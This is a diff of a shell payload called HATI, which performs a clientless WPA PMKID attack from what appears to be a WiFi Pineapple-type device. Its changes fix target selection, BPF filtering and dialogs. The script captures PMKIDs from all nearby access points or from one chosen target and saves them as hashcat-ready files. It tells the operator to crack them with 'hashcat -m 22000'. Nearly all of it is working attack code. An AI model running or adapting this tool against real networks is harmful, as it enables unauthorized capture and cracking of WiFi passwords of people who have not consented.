@@ -2,7 +2,7 @@
 # Title: HATI - Moon Hunter
 # Description: Clientless WPA PMKID attack - the wolf that hunts in darkness
 # Author: HaleHound
-# Version: 1.2.0
+# Version: 1.4.4
 # Category: user/attack
 # Requires: hcxdumptool, hcxpcapngtool (hcxtools)
 # Named after: Hati Hróðvitnisson - the wolf that chases the moon
@@ -10,6 +10,16 @@
 # PMKID Attack: Captures the PMKID from the AP's first EAPOL message
 # No client connection needed - works even on empty networks
 # Output: Hashcat-ready .22000 files for offline cracking
+#
+# Changelog:
+#   1.4.4 - Fixed UI text: B button says "Exit" (matches actual behavior)
+#   1.4.3 - Simplified scan_targets (removed spinner, direct _pineap call like device_hunter)
+#   1.4.2 - Fixed scan_targets hanging (added 10s timeout to _pineap call)
+#   1.4.1 - Fixed B button in target select (now exits instead of switching to broadcast)
+#   1.4.0 - Fixed CONFIRMATION_DIALOG handling (was using non-existent variables)
+#   1.3.0 - Fixed targeted mode BPF filtering for opkg hcxdumptool 6.3.4
+#         - Improved menu dialogs for clarity
+#   1.2.0 - Initial release
 
 # === CONFIGURATION ===
 LOOTDIR="/root/loot/hati"
@@ -34,8 +44,8 @@ check_for_stop() {
 
 # === CLEANUP ===
 cleanup() {
-    pkill -9 -f "hcxdumptool" 2>/dev/null
-    rm -f /tmp/hati_running /tmp/hati_status
+    killall -9 hcxdumptool 2>/dev/null
+    rm -f /tmp/hati_running /tmp/hati_status /tmp/hati_target.bpf
     LED WHITE
 }
 
@@ -98,9 +108,9 @@ check_tools() {
 }
 
 install_tools() {
-    LOG "Installing hcxdumptool and hcxtools..."
+    LOG "Installing tools..."
     LOG ""
-    LOG "Updating package lists..."
+    LOG "Updating opkg..."
     timeout 60 opkg update >/dev/null 2>&1
     LOG "Installing hcxdumptool..."
     timeout 120 opkg install hcxdumptool >/dev/null 2>&1
@@ -126,11 +136,9 @@ TOTAL_APS=0
 
 scan_targets() {
     LOG "Scanning for targets..."
-    SCAN_ID=$(START_SPINNER "Scanning APs...")
 
-    local json=$(_pineap RECON APS limit=30 format=json)
-
-    STOP_SPINNER "$SCAN_ID"
+    # Direct call like device_hunter - no spinner to avoid issues
+    local json=$(_pineap RECON APS limit=20 format=json)
 
     AP_MACS=()
     AP_SSIDS=()
@@ -166,7 +174,8 @@ show_target() {
     LOG "${AP_MACS[$SELECTED]}"
     LOG "Channel: ${AP_CHANNELS[$SELECTED]}"
     LOG ""
-    LOG "UP/DOWN=Scroll A=Select B=Back"
+    LOG "[UP/DOWN] Scroll  [A] Select"
+    LOG "[B] Exit"
 }
 
 select_target() {
@@ -218,13 +227,13 @@ capture_pmkid() {
         LOG "Target: $target_mac"
         LOG "Channel: $target_channel"
     else
-        LOG "Mode: Scan ALL APs"
+        LOG "Mode: BROADCAST (All APs)"
     fi
 
     LOG "Duration: ${duration}s"
     LOG "Output: $capfile"
     LOG ""
-    LOG "A = Stop capture"
+    LOG "[A] = Stop capture early"
     LOG ""
 
     led_capturing
@@ -235,9 +244,19 @@ capture_pmkid() {
     local cmd="hcxdumptool -i $INTERFACE -w $capfile --rds=1"
 
     if [ "$mode" = "targeted" ]; then
-        # Create filter file for target MAC
-        echo "$target_mac" > "$bpffile"
-        cmd="$cmd --filterlist_ap=$bpffile --filtermode=2"
+        # Create BPF filter for target MAC
+        # Remove colons from MAC for BPF filter format
+        local mac_no_colons=$(echo "$target_mac" | tr -d ':' | tr '[:upper:]' '[:lower:]')
+
+        # Compile BPF filter using hcxdumptool's built-in compiler
+        LOG "Creating target filter..."
+        if ! hcxdumptool --bpfc="wlan addr3 $mac_no_colons" > "$bpffile" 2>/dev/null; then
+            # Fallback: try without BPF if compilation fails
+            LOG "BPF filter failed, using channel lock only"
+            rm -f "$bpffile"
+        else
+            cmd="$cmd --bpf=$bpffile"
+        fi
 
         # Lock to target channel (add band indicator)
         if [ -n "$target_channel" ]; then
@@ -248,7 +267,7 @@ capture_pmkid() {
             fi
         fi
     else
-        # Scan all frequencies
+        # Broadcast mode: Scan all frequencies
         cmd="$cmd -F"
     fi
 
@@ -263,7 +282,10 @@ capture_pmkid() {
         led_error
         play_fail
         LOG "Capture failed to start"
-        cat /tmp/hati_status
+        LOG ""
+        # Show error details
+        head -10 /tmp/hati_status 2>/dev/null
+        rm -f "$bpffile"
         return 1
     fi
 
@@ -274,6 +296,7 @@ capture_pmkid() {
 
     while [ $elapsed -lt $duration ]; do
         if check_for_stop; then
+            LOG ""
             LOG "Stopping capture..."
             kill -9 $cap_pid 2>/dev/null
             break
@@ -298,7 +321,7 @@ capture_pmkid() {
         fi
 
         local remaining=$((duration - elapsed))
-        LOG "[${remaining}s] Hunting PMKIDs... ($pmkid_count captured)"
+        LOG "[${remaining}s] Hunting... ($pmkid_count PMKIDs)"
 
         sleep 1
         elapsed=$((elapsed + 1))
@@ -356,7 +379,7 @@ capture_pmkid() {
         LOG "Crack with:"
         LOG "  hashcat -m 22000 $hashfile wordlist.txt"
 
-        ALERT "PMKID CAPTURE SUCCESS!\n\nCaptured: $hash_count PMKIDs\n\nFiles saved to:\n$LOOTDIR\n\nReady for hashcat -m 22000"
+        ALERT "SUCCESS!\n\nCaptured: $hash_count PMKIDs\n\nSaved to:\n$LOOTDIR\n\nCrack with:\nhashcat -m 22000"
 
         return 0
     else
@@ -378,7 +401,7 @@ capture_pmkid() {
             LOG "  $capfile"
         fi
 
-        ALERT "No PMKIDs Captured\n\nTry:\n- Longer duration\n- Different target\n- Move closer to AP"
+        ALERT "No PMKIDs Found\n\nTry:\n- Longer duration\n- Different target\n- Move closer to AP\n\nPCAP saved anyway"
 
         return 1
     fi
@@ -392,7 +415,7 @@ LOG "| || | /_\\_   _|_ _|"
 LOG "| __ |/ _ \\| |  | | "
 LOG "|_||_/_/ \\_\\_| |___|"
 LOG ""
-LOG "    HATI v1.2 - Moon Hunter"
+LOG "    HATI v1.4.4 - Moon Hunter"
 LOG ""
 LOG " Clientless WPA PMKID Attack"
 LOG ""
@@ -401,130 +424,86 @@ LOG ""
 if ! check_tools; then
     LOG "Required tools not installed"
 
-    install_confirm=$(CONFIRMATION_DIALOG "Install hcxdumptool and hcxtools?\n\nRequired for PMKID attacks")
-    case $? in
-        $DUCKYSCRIPT_CANCELLED)
-            LOG "Cancelled"
-            exit 1
-            ;;
-        $DUCKYSCRIPT_REJECTED)
-            LOG "Rejected"
-            exit 1
-            ;;
-        $DUCKYSCRIPT_ERROR)
-            LOG "Error"
-            exit 1
-            ;;
-    esac
-
-    if [ "$install_confirm" = "1" ]; then
+    # CONFIRMATION_DIALOG returns "1" for Yes, "0" for No
+    if [ "$(CONFIRMATION_DIALOG "TOOLS NEEDED\n\nhcxdumptool + hcxtools\nWill install from opkg.\n\nInstall now?")" = "1" ]; then
         if ! install_tools; then
-            ERROR_DIALOG "Failed to install tools\n\nTry manually:\nopkg update\nopkg install hcxdumptool hcxtools"
-            exit 1
+            ERROR_DIALOG "Install Failed\n\nTry manually:\nopkg update\nopkg install hcxdumptool hcxtools"
+            exit 0
         fi
     else
         LOG "Tools required - exiting"
-        exit 1
+        exit 0
     fi
 fi
 
 LOG "Tools ready"
 LOG ""
 
-# Mode selection
-mode_choice=$(CONFIRMATION_DIALOG "Scan ALL nearby APs?\n\nYes = Capture from all APs\nNo = Select specific target")
-case $? in
-    $DUCKYSCRIPT_CANCELLED)
-        LOG "Cancelled"
-        exit 1
-        ;;
-    $DUCKYSCRIPT_REJECTED)
-        LOG "Rejected"
-        exit 1
-        ;;
-    $DUCKYSCRIPT_ERROR)
-        LOG "Error"
-        exit 1
-        ;;
-esac
-
+# Mode selection - "1" = Yes (All), "0" = No (Specific)
 TARGET_MODE="all"
 TARGET_MAC=""
 TARGET_CHANNEL=""
 
-if [ "$mode_choice" != "1" ]; then
+if [ "$(CONFIRMATION_DIALOG "SCAN ALL NETWORKS?\n\nYes = All APs at once\nNo = Pick one target")" = "1" ]; then
+    # User selected YES - Broadcast mode
+    TARGET_MODE="all"
+    LOG "Mode: Broadcast (All APs)"
+else
+    # User selected NO - Targeted mode
     TARGET_MODE="targeted"
+    LOG "Mode: Targeted"
 
     # Scan for targets
     if ! scan_targets; then
-        ERROR_DIALOG "No targets found\n\nStart Recon scan first"
-        exit 1
+        ERROR_DIALOG "NO TARGETS\n\nNo APs found in Recon data.\n\nRun Recon scan first."
+        exit 0
     fi
 
     # Let user pick target
     if ! select_target; then
-        LOG "Cancelled"
+        # User pressed B - exit payload
+        LOG "Cancelled - exiting"
         exit 0
     fi
 
-    TARGET_MAC="${AP_MACS[$SELECTED]}"
-    TARGET_CHANNEL="${AP_CHANNELS[$SELECTED]}"
+    # Target selected
+    if true; then
+        TARGET_MAC="${AP_MACS[$SELECTED]}"
+        TARGET_CHANNEL="${AP_CHANNELS[$SELECTED]}"
 
-    LOG "Selected: ${AP_SSIDS[$SELECTED]}"
-    LOG "MAC: $TARGET_MAC"
-    LOG "Channel: $TARGET_CHANNEL"
+        LOG "Selected: ${AP_SSIDS[$SELECTED]}"
+        LOG "MAC: $TARGET_MAC"
+        LOG "Channel: $TARGET_CHANNEL"
+    fi
 fi
 
-# Duration selection
-duration=$(NUMBER_PICKER "Capture duration (seconds)" 60)
-case $? in
-    $DUCKYSCRIPT_CANCELLED)
-        LOG "Cancelled"
-        exit 1
-        ;;
-    $DUCKYSCRIPT_REJECTED)
-        LOG "Rejected"
-        exit 1
-        ;;
-    $DUCKYSCRIPT_ERROR)
-        LOG "Error"
-        exit 1
-        ;;
-esac
+# Duration selection with guidance
+duration=$(NUMBER_PICKER "HUNT DURATION\n\n30s  = Quick scan\n60s  = Normal\n120s = Deep scan\n\nSeconds:" 60)
+
+# Validate duration bounds
+if [ -z "$duration" ] || [ "$duration" -lt 10 ] 2>/dev/null; then
+    duration=60
+fi
+if [ "$duration" -gt 600 ]; then
+    duration=600
+fi
 
 # Confirm and start
-confirm_msg="Start HATI Hunt?\n\nMode: "
+confirm_msg="READY TO HUNT\n\nMode: "
 if [ "$TARGET_MODE" = "all" ]; then
-    confirm_msg="${confirm_msg}Scan ALL APs"
+    confirm_msg="${confirm_msg}BROADCAST (All APs)"
 else
-    confirm_msg="${confirm_msg}Target ${AP_SSIDS[$SELECTED]}"
+    confirm_msg="${confirm_msg}${AP_SSIDS[$SELECTED]}"
 fi
-confirm_msg="${confirm_msg}\nDuration: ${duration}s"
+confirm_msg="${confirm_msg}\nTime: ${duration}s\n\nStart capture?"
 
-confirm=$(CONFIRMATION_DIALOG "$confirm_msg")
-case $? in
-    $DUCKYSCRIPT_CANCELLED)
-        LOG "Cancelled"
-        exit 1
-        ;;
-    $DUCKYSCRIPT_REJECTED)
-        LOG "Rejected"
-        exit 1
-        ;;
-    $DUCKYSCRIPT_ERROR)
-        LOG "Error"
-        exit 1
-        ;;
-esac
-
-if [ "$confirm" != "1" ]; then
+if [ "$(CONFIRMATION_DIALOG "$confirm_msg")" = "1" ]; then
+    # Run capture
+    led_hunting
+    capture_pmkid "$TARGET_MODE" "$TARGET_MAC" "$TARGET_CHANNEL" "$duration"
+else
     LOG "Cancelled by user"
-    exit 0
 fi
-
-# Run capture
-led_hunting
-capture_pmkid "$TARGET_MODE" "$TARGET_MAC" "$TARGET_CHANNEL" "$duration"
 
 LED WHITE
 LOG ""
